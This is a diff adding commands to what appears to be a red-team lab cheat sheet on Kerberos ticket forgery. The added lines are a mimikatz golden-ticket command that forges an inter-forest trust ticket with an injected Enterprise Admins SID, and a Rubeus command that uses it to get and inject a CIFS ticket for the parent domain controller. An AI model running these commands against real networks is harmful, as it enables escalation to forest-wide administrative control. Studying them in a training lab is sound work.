@@ -31,6 +31,10 @@ C:\AD\Tools\mimikatz.exe "kerberos::golden /User:Administrator /domain:dollarcor
 
 ## Golden Ticket intra-forest domain
 ```
+kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:d27fb7ee4e34dd921cdb629eb2b25777 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\trust_moneycorp.kirbi
+```
+```
+C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\trust_moneycorp.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
 ```
 
 ## Diamon Ticket
